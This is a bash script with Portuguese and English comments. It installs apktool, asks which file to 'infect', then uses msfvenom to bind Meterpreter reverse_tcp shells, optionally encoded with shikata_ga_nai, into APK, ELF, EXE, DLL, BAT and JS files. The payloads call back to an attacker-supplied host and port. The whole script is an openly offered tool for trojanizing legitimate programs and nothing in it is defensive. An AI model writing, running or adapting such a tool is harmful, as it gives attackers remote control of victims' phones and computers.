#!/bin/bash

# Função para verificar e instalar o apktool
install_apktool() {
  if ! command -v apktool &> /dev/null; then
    echo "apktool não está instalado. Instalando agora..."
    
    # Baixar o apktool
    wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
    wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool.jar

    # Mover para /usr/local/bin e tornar executável
    sudo mv apktool /usr/local/bin
    sudo mv apktool.jar /usr/local/bin
    sudo chmod +x /usr/local/bin/apktool

    # Verificar se a instalação foi bem-sucedida
    if command -v apktool &> /dev/null; then
      echo "apktool instalado com sucesso."
    else
      echo "Falha ao instalar o apktool. Continuando sem ele..."
    fi
  else
    echo "apktool já está instalado."
  fi
}

# Instalar o apktool se necessário
install_apktool

# Prompt the user for the file path or name
echo "Digite o caminho ou nome do arquivo que você deseja infectar (por exemplo, /path/to/file ou file):"
read file

# Check if the user provided a path or just a file name
if [[ $file == */* ]]; then
  file_path=$file
else
  file_path="./$file"
fi

# Detect the file extension
ext="${file_path##*.}"

# Perguntar se o usuário deseja usar um encoder
echo "Deseja usar um encoder? (s/n)"
read use_encoder

# Define o encoder se o usuário escolher "s"
if [[ $use_encoder == "s" ]]; then
  encoder="-e x86/shikata_ga_nai -i 5"
else
  encoder=""
fi

# Use MSFVenom to create the reverse shell payload with or without an encoder
if [[ $ext == "apk" ]]; then
  msfvenom -a android -x $file_path $encoder -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -o infected_file.apk
elif [[ $ext == "elf" ]]; then
  msfvenom -a linux -x $file_path $encoder -platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o infected_file.elf
elif [[ $ext == "pdf" ]]; then
  msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> $encoder -f pdf -o infected_file.pdf
elif [[ $ext == "exe" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o infected_file.exe
elif [[ $ext == "dll" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f dll -o infected_file.dll
elif [[ $ext == "bat" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f bat -o infected_file.bat
elif [[ $ext == "js" ]]; then
  msfvenom -a x86 --platform Windows -x $file_path $encoder -platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f js -o infected_file.js
else
  echo "Extensão de arquivo não suportada: $ext"
  exit 1
fi
